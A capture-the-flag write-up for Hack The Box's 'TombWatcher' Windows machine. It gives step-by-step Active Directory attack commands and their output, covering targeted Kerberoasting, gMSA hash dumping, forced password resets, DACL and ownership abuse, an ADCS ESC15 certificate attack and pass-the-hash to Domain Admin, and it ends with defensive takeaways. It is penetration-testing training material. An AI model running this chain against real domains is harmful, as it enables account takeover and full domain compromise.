# HTB Write-Up: TombWatcher

| Field      | Details                                                                 |
|------------|-------------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/TombWatcher)         |
| Difficulty | Hard                                                                    |
| OS         | Windows                                                                 |
| Author     | Samurai                                                                 |
| Date       | June 13, 2026                                                           |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — BloodHound & ACL Analysis](#2-enumeration--bloodhound--acl-analysis)
3. [Lateral Movement — Targeted Kerberoasting & gMSA Abuse](#3-lateral-movement--targeted-kerberoasting--gmsa-abuse)
4. [Lateral Movement — WriteOwner Abuse & WinRM Access as John](#4-lateral-movement--writeowner-abuse--winrm-access-as-john)
5. [Privilege Escalation — ADCS Recycle Bin & ESC15](#5-privilege-escalation--adcs-recycle-bin--esc15)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** for service and version fingerprinting:

```bash
nmap -sC -sV -oN nmap.txt 10.129.232.167
```

**Open Ports:**

| Port  | Service       | Details                                               |
|-------|---------------|-------------------------------------------------------|
| 53    | DNS           | Simple DNS Plus                                       |
| 80    | HTTP          | Microsoft IIS httpd 10.0                              |
| 88    | Kerberos      | Microsoft Windows Kerberos                            |
| 135   | MSRPC         | Microsoft Windows RPC                                 |
| 139   | NetBIOS       | Microsoft Windows netbios-ssn                         |
| 389   | LDAP          | Domain: `tombwatcher.htb`                             |
| 445   | SMB           | microsoft-ds                                          |
| 464   | kpasswd5      | tcpwrapped                                            |
| 593   | HTTP-RPC      | RPC over HTTP 1.0                                     |
| 636   | LDAPS         | Microsoft Windows Active Directory LDAP (SSL)         |
| 3268  | LDAP          | Microsoft Windows Active Directory LDAP (Global Cat.) |
| 3269  | LDAPS         | Microsoft Windows Active Directory LDAP (Global Cat.) |
| 5985  | WinRM         | Windows Remote Management                             |

The host is a **Domain Controller** (`DC01`) running **Windows Server 2019**, domain: **`tombwatcher.htb`**.

The machine was provided with a set of starting credentials: **`henry / H3nry_987TGV!`**

---

## 2. Enumeration — BloodHound & ACL Analysis

### 2.1 — SMB Share Enumeration

Null and guest sessions were denied. Authenticated enumeration with henry confirmed standard DC shares only:

```bash
netexec smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

SYSVOL was browsed but contained only default GPO content with no useful data.

### 2.2 — Domain User Enumeration

Users were enumerated via SMB and LDAP:

```bash
netexec smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!' --users
```

```bash
ldapsearch -H ldap://tombwatcher.htb -x \
  -D "henry@tombwatcher.htb" -w 'H3nry_987TGV!' \
  -b "DC=tombwatcher,DC=htb" "(objectClass=user)" sAMAccountName cn description
```

**Users discovered:** `Administrator`, `Guest`, `krbtgt`, `Henry`, `Alfred`, `sam`, `john`, `ansible_dev$` (gMSA)

### 2.3 — BloodHound Collection

BloodHound was used to map the full ACL graph of the domain:

```bash
bloodhound-python -d tombwatcher.htb -dc dc01.tombwatcher.htb \
  -c All --zip -u henry -p 'H3nry_987TGV!' -ns 10.129.232.167
```

**Key findings from BloodHound:**

- **`henry`** has **WriteSPN** over **`alfred`** — enables Targeted Kerberoasting.
- **`alfred`** has **AddSelf** on the **`INFRASTRUCTURE`** group.
- **`INFRASTRUCTURE`** group can read the **gMSA password** for **`ansible_dev$`**.
- **`ansible_dev$`** has **ForceChangePassword** over **`sam`**.
- **`sam`** has **WriteOwner** over **`john`**.
- **`john`** has **CanPSRemote** to **DC01** and **GenericAll** over the **ADCS OU**.

The attack chain: `henry → alfred → INFRASTRUCTURE → ansible_dev$ → sam → john → ADCS OU → Domain Admin`

---

## 3. Lateral Movement — Targeted Kerberoasting & gMSA Abuse

### 3.1 — Targeted Kerberoast: Henry → Alfred

BloodHound showed `henry` has **WriteSPN** over `alfred`. A targeted Kerberoast was performed using `targetedKerberoast.py`:

```bash
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

**Output:**

```
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$7af4702a...5dcbb2
[VERBOSE] SPN removed successfully for (Alfred)
```

The TGS-REP hash was cracked with **hashcat**:

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

**Result:** `basketball`

| Account                    | Password     |
|----------------------------|--------------|
| `tombwatcher.htb\alfred`   | `basketball` |

### 3.2 — AddSelf Abuse: Alfred → INFRASTRUCTURE Group

BloodHound showed `alfred` has **AddSelf** rights on the `INFRASTRUCTURE` group. Alfred was added using **bloodyAD**:

```bash
bloodyad --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u alfred -p basketball add groupMember INFRASTRUCTURE alfred
```

```
[+] alfred added to INFRASTRUCTURE
```

### 3.3 — gMSA Password Dump: INFRASTRUCTURE → ansible_dev$

With alfred now a member of INFRASTRUCTURE, the gMSA password for `ansible_dev$` became readable:

```bash
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d tombwatcher.htb -l dc01.tombwatcher.htb
```

**Output:**

```
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::b91f529d36292ba764273e5dd7b90fa1
ansible_dev$:aes256-cts-hmac-sha1-96:3eafb50e4a2d0982e7f8ac906387f812703bab1a23d300d5cb450639bb359f7b
```

### 3.4 — ForceChangePassword: ansible_dev$ → sam

`ansible_dev$` has **ForceChangePassword** over `sam`. The password was reset using Pass-the-Hash with `pth-net`:

```bash
pth-net rpc password "sam" "newP@ssword2022" \
  -U "tombwatcher.htb"/'ansible_dev$'%"ffffffffffffffffffffffffffffffff":"b91f529d36292ba764273e5dd7b90fa1" \
  -S "dc01.tombwatcher.htb"
```

Authentication confirmed:

```bash
netexec smb 10.129.232.167 -u 'sam' -p 'newP@ssword2022'
# [+] tombwatcher.htb\sam:newP@ssword2022
```

---

## 4. Lateral Movement — WriteOwner Abuse & WinRM Access as John

### 4.1 — WriteOwner: sam → john

`sam` has **WriteOwner** over `john`. Ownership was claimed first, then FullControl was granted over john's object:

```bash
# Step 1 - Take ownership
bloodyad --host dc01.tombwatcher.htb -d tombwatcher.htb \
  -u sam -p 'newP@ssword2022' set owner john sam
```

```
[+] Old owner S-1-5-21-... is now replaced by sam on john
```

```bash
# Step 2 - Grant FullControl via dacledit
impacket-dacledit -action 'write' -rights 'FullControl' \
  -principal 'sam' -target 'john' \
  'tombwatcher.htb'/'sam':'newP@ssword2022'
```

```
[*] DACL modified successfully!
```

```bash
# Step 3 - Reset john's password
net rpc password "john" "newP@ssword2022" \
  -U "tombwatcher.htb"/"sam"%"newP@ssword2022" \
  -S "dc01.tombwatcher.htb"
```

Authentication confirmed:

```bash
netexec smb 10.129.232.167 -u 'john' -p 'newP@ssword2022'
# [+] tombwatcher.htb\john:newP@ssword2022
```

### 4.2 — WinRM Shell as John & User Flag

`john` has **CanPSRemote** to DC01:

```bash
evil-winrm -i tombwatcher.htb -u john -p 'newP@ssword2022'
```

```
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
d5653ba4166cabf2981b4d8341f98bdb
```

**User flag retrieved.**

---

## 5. Privilege Escalation — ADCS Recycle Bin & ESC15

### 5.1 — Certipy Enumeration

BloodHound showed `john` has **GenericAll** over the **ADCS OU**. ADCS was enumerated from the attacker machine:

```bash
certipy-ad find -u john@tombwatcher.htb -p 'newP@ssword2022' \
  -dc-ip 10.129.232.167 -vulnerable -stdout
```

The **WebServer** template was identified with the following notable attributes:

```
Template Name          : WebServer
Schema Version         : 1
Enrollee Supplies Subject : True
Extended Key Usage     : Server Authentication
Enrollment Rights      : Domain Admins, Enterprise Admins,
                         S-1-5-21-1392491010-1358638721-2126982587-1111
```

The unresolved SID `S-1-5-21-...-1111` on the enrollment rights is a strong indicator of a **deleted account** that still retains permissions on the template — a classic orphaned ACE scenario. This SID needed to be resolved and the account restored to leverage the enrollment right.

### 5.2 — Restoring cert_admin from the Recycle Bin

The deleted object was queried from an Evil-WinRM session as john using the native AD module:

```powershell
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' `
  -IncludeDeletedObjects -Properties *
```

The GUID of the deleted `cert_admin` account was recovered. It was restored using:

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

### 5.3 — Propagating GenericAll over the ADCS OU to cert_admin

Since `john` has **GenericAll** over the ADCS OU, FullControl with inheritance was written to the OU, granting john (and subsequently cert_admin after password reset) full control over objects within it:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance \
  -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' \
  TOMBWATCHER.HTB/john:'newP@ssword2022'
```

```
[*] DACL modified successfully!
```

### 5.4 — Reset cert_admin's Password

With control over the ADCS OU, cert_admin's password was reset via bloodyAD:

```bash
bloodyad --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' \
  -u 'john' -p 'newP@ssword2022' set password cert_admin 'newP@ssword2022'
```

```
[+] Password changed successfully!
```

### 5.5 — ESC15: Request a Certificate as Administrator

ESC15 abuses Schema Version 1 templates where `Enrollee Supplies Subject` is enabled and the CA does not enforce SAN restrictions. The attack requires two certificate requests:

**Step 1 — Request a Certificate Request Agent cert using the WebServer template:**

```bash
certipy-ad req -u cert_admin -p 'newP@ssword2022' \
  -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb \
  -ca tombwatcher-CA-1 -template WebServer \
  -upn administrator@tombwatcher.htb \
  -application-policies 'Certificate Request Agent'
```

```
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

**Step 2 — Use the agent cert to enroll on behalf of Administrator:**

```bash
certipy-ad req -u cert_admin -p 'newP@ssword2022' \
  -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb \
  -ca tombwatcher-CA-1 -template User \
  -pfx administrator.pfx \
  -on-behalf-of 'tombwatcher\Administrator'
```

```
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

### 5.6 — Authenticate as Administrator & Root Flag

Clock skew was fixed before Kerberos authentication:

```bash
sudo ntpdate tombwatcher.htb
```

The certificate was used to obtain the Administrator NT hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.167
```

```
[*] Got TGT
[*] Got hash for 'administrator@tombwatcher.htb':
    aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

A shell was opened via Pass-the-Hash:

```bash
evil-winrm -i tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b7a415eadfc7d843db3da3616876a2ac
```

**Root flag retrieved.**

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap | DC01 identified, `tombwatcher.htb`, Windows Server 2019 |
| Enumeration | BloodHound + LDAP | Full ACL chain mapped: `henry → alfred → INFRASTRUCTURE → ansible_dev$ → sam → john → ADCS OU → DA` |
| Kerberoasting | WriteSPN abuse + `targetedKerberoast.py` | `alfred` TGS cracked → `basketball` |
| Group Abuse | AddSelf → INFRASTRUCTURE | `alfred` joined INFRASTRUCTURE group |
| gMSA Dump | `gMSADumper.py` | `ansible_dev$` NT hash recovered |
| Lateral (1) | ForceChangePassword via pth-net | `sam` password reset |
| Lateral (2) | WriteOwner → dacledit → `net rpc password` | `john` password reset |
| User Flag | Evil-WinRM as `john` | `user.txt` from `\john\Desktop` |
| ADCS Enum | `certipy-ad find` | WebServer template with orphaned SID on enrollment rights |
| Recycle Bin | `Get-ADObject` + `Restore-ADObject` | `cert_admin` restored |
| DACL Abuse | `impacket-dacledit` (GenericAll on ADCS OU) | FullControl propagated; `cert_admin` password reset |
| ESC15 | Two-stage certipy req (WebServer → User on-behalf-of) | Certificate issued for Administrator |
| Root | `certipy-ad auth` + Evil-WinRM PtH | `root.txt` from `\Administrator\Desktop` |

### Key Takeaways

**BloodHound ACL chains are the backbone of AD pentesting.** This machine is a textbook example of a multi-hop privilege escalation path built entirely from delegated permissions. No single hop was sufficient alone — the power came from chaining: WriteSPN → AddSelf → gMSA → ForceChangePassword → WriteOwner → GenericAll → ADCS. Without BloodHound, discovering these relationships manually would take hours.

**Orphaned SIDs in certificate template ACLs are a critical misconfiguration.** When a principal is deleted from AD but its ACE remains on a certificate template, that permission doesn't disappear. If the AD Recycle Bin is enabled and an attacker can restore the object, they inherit all associated rights — including certificate enrollment. Template ACLs should be audited after any account deletion.

**ESC15 targets Schema Version 1 templates with Enrollee Supplies Subject.** These legacy templates predate the SAN enforcement controls introduced in modern ADCS. When combined with Certificate Request Agent rights, they enable enrollment on behalf of any user in the domain — including Administrator. Any Schema v1 template with `Enrollee Supplies Subject` should be treated as a high-risk object.

**gMSA passwords are effectively NTLM hashes.** Once a principal has `ReadGMSAPassword` rights, the gMSA is fully compromised for Pass-the-Hash without any cracking required. Group membership granting this right should be strictly controlled.

**WriteOwner is as dangerous as GenericAll — it just takes one extra step.** Taking ownership of an object bypasses its DACL entirely, allowing an attacker to rewrite permissions before performing any further abuse. Any WriteOwner edge in BloodHound should be treated with the same urgency as GenericAll.
